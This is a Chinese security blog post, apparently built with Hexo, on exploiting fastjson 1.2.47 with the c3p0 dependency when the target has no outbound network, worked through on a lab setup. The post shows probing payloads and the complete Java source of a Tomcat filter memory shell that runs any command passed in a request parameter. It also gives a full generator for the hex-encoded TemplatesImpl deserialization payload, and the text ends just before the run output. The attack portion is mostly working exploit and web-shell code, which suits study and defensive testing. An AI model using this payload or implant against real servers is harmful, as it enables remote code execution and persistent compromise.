@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n." />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      FastJson不出网的利用 
+      
+      
+      |
+    
+     X2n.: Keep your passion for what you love !
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="X2n.: Keep your passion for what you love !" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">X2n.</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">FastJson不出网的利用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-10-29 13:03:35
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Java/" title="Java">
+                    #Java
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/FastJson/" title="FastJson">
+                    #FastJson
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" title="Web安全">
+                    <b>#</b> Web安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="简介">简介</h2>
+<p>现实环境中可能会遇到fastjson不出网的情况，下面打两个不出网的靶场<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>。</p>
+<h2 id="fastjson1-2-47结合c3p0绕waf，不出网环境">fastjson1.2.47结合c3p0绕waf，不出网环境</h2>
+<p>这个环境比较特殊，docker起的两台机器，构造的机器不出网环境。</p>
+<p>还是一样，首先就是探测具体版本。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/image-20251025151245499.png" alt="image-20251025151245499"></p>
+<p>版本1.2.47。这个漏洞爆出版本为1.2.47，在这个版本及以下fastjosn存在<strong>mappings缓存通杀绕过</strong>，利用的方式为JNDI，但不要忘了<strong>JNDI的利用是有一定条件的</strong>：</p>
+<p>1、一般需要出网环境。</p>
+<p>2、受到JDK版本限制，JDK8u191后受到trusturlcodebase限制远程加载，但也有绕过方法。</p>
+<p>这里因为机器不出网，JNDI注入并不太适合，所以需要找其他方法。</p>
+<p>因此下一步探测存在的依赖。利用Character转换报错可以判断存在何种依赖。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Character&quot;</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>报错如下，<code>RequestMapping</code>本身为<code>SpringBoot</code>下的类，当存在该类时<strong>会报出类型转换错误</strong>，说明为SpringBoot项目。</p>
+<p><img src="/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/image-20251025193804424.png" alt="image-20251025193804424"></p>
+<p>否则无显示。</p>
+<p><img src="/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/image-20251025194100225.png" alt="image-20251025194100225"></p>
+<p>因此，通过这种方法结合已知的fastjson利用链POC所需的依赖类，最终探测服务中<strong>存在<code>C3P0</code>依赖</strong>（<code>com.mchange.v2.c3p0.DataSources</code>）。</p>
+<p><img src="/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/image-20251025194357111.png" alt="image-20251025194357111"></p>
+<p>fastjson本身结合<code>c3p0</code>有很多利用方式，其中提到最多的是不出网利用，hex base二次反序列化打内存马。在c3p0+fastjson利用其他文章中介绍的是需要依赖像cc链这样的反序列化链，但其实是不需要的，因为<strong>fastjson全版本都存在原生反序列化漏洞</strong>，且是通过<code>TemplatesImpl</code>加载类，很适合打内存马。</p>
+<h3 id="不出网打普通内存马">不出网打普通内存马</h3>
+<p>先找一个普通的内存马：Tomcat的Filter型内存马<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，但是直接引用是不行的，<strong>在<code>c3p0</code>二次反序列化环境中，如果针对不出网机器，需要使用的是<code>TemplatesImpl</code>这条链加载恶意字节码</strong>。但是<strong>对于使用<code>TemplatesImpl</code>，需要在恶意类中继承<code>AbstractTranslet</code>，并重写他的两个方法，否则该类无法被加载</strong>。更改后的内存马如下：<code>Fain.java</code>，要编译为class文件。就是在原来代码的基础上<code>extends AbstractTranslet</code>，然后重写<code>AbstractTranslet</code>的<code>transform</code>，在下面代码的最后，是重写的两个方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FRain</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;AutomneGreet&quot;</span>;</span><br><span class="line">            <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FRain</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(name);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap.setFilterName(name);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">                filterConfigs.put(name,filterConfig);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception hi)&#123;</span><br><span class="line">            <span class="comment">//hi.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;chan&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;chan&quot;</span>));</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>依赖如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>之后就是关于C3P0二次反序列这条链，细节就不说了，与之前唯一个区别是之前使用的CC6那条反序列化链，但是其实<strong>fastjson全版本都存在类似CC这样的原生反序列化链漏洞，就不在需要对方环境中存在CC这样的依赖</strong>。 最终exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex2</span> <span class="operator">=</span> bytesToHex(tobyteArray(gen()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">FJ1247</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + hex2 + <span class="string">&quot;;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(FJ1247);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//FastJson原生反序列化加载恶意类字节码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">gen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xxxxx/History_vuls/FastJsonParty/fastjson-c3p0-no-network/target/classes/FRain.class&quot;</span>)); <span class="comment">//换成恶意类的路径</span></span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将类序列化为字节数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);   <span class="comment">//</span></span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字节数组转十六进制</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(bytes[i] &amp; <span class="number">0xff</span>);      <span class="comment">//bytes[]中为带符号字节-255~+255，&amp;0xff: 保证得到的数据在0~255之间</span></span><br><span class="line">            <span class="keyword">if</span> (hex.length()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                stringBuffer.append(<span class="string">&quot;0&quot;</span> + hex);   <span class="comment">//0-9 则在前面加‘0’,保证2位避免后面读取错误</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                stringBuffer.append(hex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行<code>Test.java</code>，运行的结果如下：</p>
